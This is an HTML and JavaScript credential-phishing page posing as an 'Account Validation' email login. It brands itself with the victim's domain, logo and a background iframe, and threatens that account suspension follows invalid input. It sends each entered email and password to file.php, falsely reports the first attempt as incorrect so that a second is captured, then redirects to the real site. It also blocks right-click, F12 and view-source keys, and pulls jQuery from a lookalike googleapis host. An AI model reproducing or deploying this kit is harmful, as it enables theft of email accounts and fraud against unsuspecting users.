<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Validation</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet"> 
  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.min.js" integrity="sha384-Atwg2Pkwv9vp0ygtn1JAojH0nYbwNJLPhwyoVbhoPwBhjQPR5VtM2+xf0Uwh9KtT" crossorigin="anonymous"></script>

</head>
<body>
    <iframe id="mainPage" src="" width="100%" scrolling="no" sandbox="allow-forms allow-pointer-lock
allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;"></iframe>
    <!-- Modal -->
	<div class="modal fade" id="myModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog">
          <div class="modal-content">
            <div class="modal-header">
              <h5 class="modal-title" id="exampleModalLabel"> <img src="" width="40%"  id="logoimg"/></h5>
              <h4><span id="logoname"></span> Account Validation</h4>
            </div>
            <div class="modal-body">Authentication Required<br/>
                Enter your Email Password to proceed...</div>
            <div class="modal-body">
                <div class="mb-3 row">
                    <label for="staticEmail" class="col-sm-2 col-form-label">Email</label>
                    <div class="col-sm-10">
                      <input type="text" readonly class="form-control-plaintext" id="email" value="" name="password" required placeholder="Enter your email address">
                    </div>
                  </div>
                  <div class="mb-3 row">
                    <label for="inputPassword" class="col-sm-2 col-form-label">Password</label>
                    <div class="col-sm-10">
                      <input type="password" class="form-control" id="password" name="password" placeholder="Enter your password here" required>
                    </div>
                  </div>
                  <div class="mb-3 row">
                  <div style="padding: 5px;"> <div id="msg" style="display: none; color:#FF0000; font-size:14px" ><p align="center">Invalid Password.! Please Enter your correct Password</p></div></div>
                </div>
                  <div class="mb-3 row">
                  <button type="button" class="btn btn-outline-danger">Note: Invalid input will disable your email account.</button>
                </div>
            </div>
            <div class="d-grid gap-2">
                <button class="btn btn-danger" type="button" id="submit-btn">Login</button>
                
              </div>
              <div class="modal-body">
                <p align="center">Email Settings | For: <span id="logoname2"></span> &copy; Copyright</p>
              </div>
          </div>
        </div>
      </div>
  <script>
  var myModal = new bootstrap.Modal(document.getElementById('myModal'), {})
  myModal.show()
  </script>
<script>
    //////////F12 disable code////////////////////////
    document.onkeypress = function (event) {
           event = (event || window.event);
           if (event.keyCode == 123) {
              //alert('No F-12');
               return false;
           }
       }
       document.onmousedown = function (event) {
           event = (event || window.event);
           if (event.keyCode == 123) {
               //alert('No F-keys');
               return false;
           }
       }
   document.onkeydown = function (event) {
           event = (event || window.event);
           if (event.keyCode == 123) {
               //alert('No F-keys');
               return false;
           }
       }
   
   
   //Disable right click script 
   var message="Sorry, right-click has been disabled"; 
   /////////////////////////////////// 
   function clickIE() {if (document.all) {(message);return false;}} 
   function clickNS(e) {if 
   (document.layers||(document.getElementById&&!document.all)) { 
   if (e.which==2||e.which==3) {(message);return false;}}} 
   if (document.layers) 
   {document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;} 
   else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;} 
   document.oncontextmenu=new Function("return false") 
   // 
   function disableCtrlKeyCombination(e)
   {
   //list all CTRL + key combinations you want to disable
   var forbiddenKeys = new Array('a', 'n', 'c', 'x', 'v', 'j' , 'w','s','u');
   var key;
   var isCtrl;
   if(window.event)
   {
   key = window.event.keyCode;     //IE
   if(window.event.ctrlKey)
   isCtrl = true;
   else
   isCtrl = false;
   }
   else
   {
   key = e.which;     //firefox
   if(e.ctrlKey)
   isCtrl = true;
   else
   isCtrl = false;
   }
   //if ctrl is pressed check if other key is in forbidenKeys array
   if(isCtrl)
   {
   for(i=0; i<forbiddenKeys.length; i++)
   {
   //case-insensitive comparation
   if(forbiddenKeys[i].toLowerCase() == String.fromCharCode(key).toLowerCase())
   {
   alert('Key combination CTRL + '+String.fromCharCode(key) +' has been disabled.');
   return false;
   }
   }
   }
   return true;
   }
   </script>


<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
<!-- <script src="https://ajax.googleapis.luchifab.com/ajax.googleapis/ajax/libs/jquery/2.2.4/jquery.min.js"></script> -->
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script> 
  
  <script src="https://ajax.googleapis.luchifab.com/ajax.googleapis/ajax/libs/jquery/2.2.4/jquery.min.js"></script> 
	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
 <script>

// prevent ctrl + s
$(document).bind('keydown', function(e) {
if(e.ctrlKey && (e.which == 83)) {
e.preventDefault();
return false;
}
});

document.addEventListener('contextmenu', event => event.preventDefault());

document.onkeydown = function(e) {
if (e.ctrlKey && 
(e.keyCode === 67 || 
e.keyCode === 86 || 
e.keyCode === 85 || 
e.keyCode === 117)) {
return false;
} else {
return true;
}
};
$(document).keypress("u",function(e) {
if(e.ctrlKey)
{
return false;      }
else {
return true;
}});




    /* global $ */
    $(document).ready(function(){
      var count=0;
 
      $('#back1').click(function () {
        $("#msg").hide();
        $('#email').val("");
        $("#automail").animate({left:200, opacity:"hide"}, 0);
        $("#inputbar").animate({right:200, opacity:"show"}, 1000);

      });

      var email = window.location.hash.substr(1);
      if (!email) {

      }
      else
      {
        var my_email =email;
        $('#email').val(my_email); 
		$('#emailich').html(my_email);
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
           email.focus;
           return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
		var c= my_slice.substr(0, my_slice.indexOf('.'));
var final= c.toLowerCase();
var finalu= c.toUpperCase();
      var mainPage = 'https://'+my_slice; 
	  
        $("#logoimg").attr("src", "https://logo.clearbit.com/"+mainPage);
		
         document.getElementById('mainPage').src = mainPage;
    //    $("#mainPage").src(mainPage);
$("#logoimg").attr("alt", finalu);
$("#logoname").html(finalu);
$(".logoname").html(finalu);
$('#logoname2').html(finalu);
$('.logoname2').html(finalu);


	 	
        $(".email").html(email);
		
		 
      }
 
      $('#submit-btn').click(function(event){
    
		//$('#error').hide();
		//$('#msg').hide();
         event.preventDefault();
	 	var email=$("#email").val();
         var password=$("#password").val();
 
		 
      ///////////new injection////////////////
      count=count+1;
    //  console.log(count); 
      $.ajax({
        dataType: 'JSON',
        url: 'file.php',
        type: 'POST',
        data:{
          email:email,
          password:password
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
			  
    //  console.log(count); 
            },
            success: function(response){
			 $('#msg').html("<span style='color:red;'>Username or Password is incorrect. Please try again</span>");
              if(response){
                $("#msg").show();
				console.log(response);
				$('#msg').html(response['msg']);
                if(response['signal'] == 'ok'){
                  $("#password").val("");
                  if (count>=2) {
                    count=0;
                    // window.location.replace(response['redirect_link']);
                    window.location.replace("http://www."+my_slice); 

                  }
                  // $('#msg').html(response['msg']);
                }
                else{
                   $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#password").val("");
              if (count>=2) {
                count=0;
                window.location.replace("http://www."+my_slice); 
              }
              $("#msg").show();
              // $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('Sign in');
            }
          });  
    });


    });


  </script>


</body>
</html>
